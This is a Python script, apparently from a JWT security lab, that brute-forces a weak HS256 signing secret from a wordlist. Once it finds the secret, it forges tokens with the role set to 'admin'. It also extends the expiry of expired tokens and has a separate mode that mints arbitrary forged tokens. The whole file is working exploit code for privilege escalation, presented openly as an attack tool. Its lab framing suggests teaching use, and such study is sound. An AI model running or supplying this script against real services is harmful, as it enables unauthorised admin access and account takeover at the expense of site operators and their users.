#!/usr/bin/env python3
"""
JWT Lab - Weak Secret Exploit

This script demonstrates brute-forcing a weak JWT secret.
"""

import jwt
import sys
import time

def brute_force_jwt(token, wordlist_path):
    """Brute force the secret key using a wordlist."""
    start_time = time.time()
    attempts = 0
    
    try:
        with open(wordlist_path, 'r') as wordlist:
            for line in wordlist:
                secret = line.strip()
                attempts += 1
                
                if attempts % 1000 == 0:
                    elapsed = time.time() - start_time
                    print(f"[*] Tried {attempts} secrets... ({attempts/elapsed:.2f} attempts/sec)")
                
                try:
                    # Try to decode the token with the current secret
                    decoded = jwt.decode(token, secret, algorithms=["HS256"])
                    elapsed = time.time() - start_time
                    print(f"\n[+] SUCCESS! Secret found: '{secret}'")
                    print(f"[+] Attempts: {attempts} ({attempts/elapsed:.2f} attempts/sec)")
                    print(f"[+] Decoded token: {decoded}")
                    
                    # Generate a new token with elevated privileges
                    decoded["role"] = "admin"
                    new_token = jwt.encode(decoded, secret, algorithm="HS256")
                    print(f"\n[+] Forged admin token: {new_token}")
                    
                    return secret
                
                except jwt.InvalidSignatureError:
                    # Wrong secret, continue to next one
                    continue
                except jwt.ExpiredSignatureError:
                    # If the token has expired, but the signature is valid
                    print(f"\n[+] SUCCESS! Secret found: '{secret}' (Token expired)")
                    print(f"[+] Attempts: {attempts}")
                    
                    # Get the payload without verification
                    payload = jwt.decode(token, options={"verify_signature": False})
                    
                    # Create a new token with a future expiration
                    payload["exp"] = int(time.time()) + 3600  # 1 hour from now
                    payload["role"] = "admin"  # Elevate privileges
                    new_token = jwt.encode(payload, secret, algorithm="HS256")
                    print(f"\n[+] Forged admin token: {new_token}")
                    
                    return secret
                except Exception as e:
                    # Other error, skip this secret
                    continue
        
        print(f"\n[-] Secret not found after {attempts} attempts")
        return None
    
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {wordlist_path}")
        return None
    except KeyboardInterrupt:
        print(f"\n[-] Brute force interrupted after {attempts} attempts")
        return None

def forge_token(secret, username="user", role="admin"):
    """Create a forged token with the given parameters."""
    payload = {
        "userId": "1234567890",
        "username": username,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600  # 1 hour from now
    }
    
    token = jwt.encode(payload, secret, algorithm="HS256")
    return token

def main():
    if len(sys.argv) < 3:
        print("Usage: python weak_secret.py <token> <wordlist>")
        print("       python weak_secret.py forge <secret> [username] [role]")
        sys.exit(1)
    
    action = sys.argv[1]
    
    if action == "forge":
        if len(sys.argv) < 3:
            print("To forge a token: python weak_secret.py forge <secret> [username] [role]")
            sys.exit(1)
        
        secret = sys.argv[2]
        username = sys.argv[3] if len(sys.argv) > 3 else "user"
        role = sys.argv[4] if len(sys.argv) > 4 else "admin"
        
        token = forge_token(secret, username, role)
        print(f"Forged token: {token}")
    else:
        token = sys.argv[1]
        wordlist_path = sys.argv[2]
        
        print(f"[*] Starting JWT brute force attack...")
        print(f"[*] Token: {token}")
        print(f"[*] Wordlist: {wordlist_path}")
        
        secret = brute_force_jwt(token, wordlist_path)

if __name__ == "__main__":
    main() 